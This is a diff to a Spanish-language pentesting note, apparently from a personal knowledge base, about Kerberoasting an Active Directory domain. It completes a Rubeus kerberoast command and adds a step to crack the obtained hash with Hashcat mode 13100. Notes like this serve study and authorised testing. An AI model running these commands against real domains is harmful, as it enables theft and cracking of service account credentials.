@@ -22,5 +22,7 @@ Si por ejemplo en la salida pone que pertenece al grupo de `Doamin Admins` del o
 En la maquina a la que tenemos acceso nos pasaremos la herramienta de [[RUBEUS]] y lo ejecutaremos
 
 ```shell
-rubeus kerberoast /domain:<dominio
+rubeus kerberoast /domain:<dominio.principal> /user:<user> /nowrap
 ```
+
+El hash obtenido se lo pasaremos a [[HASHCAT]] con la opción `-m 13100`
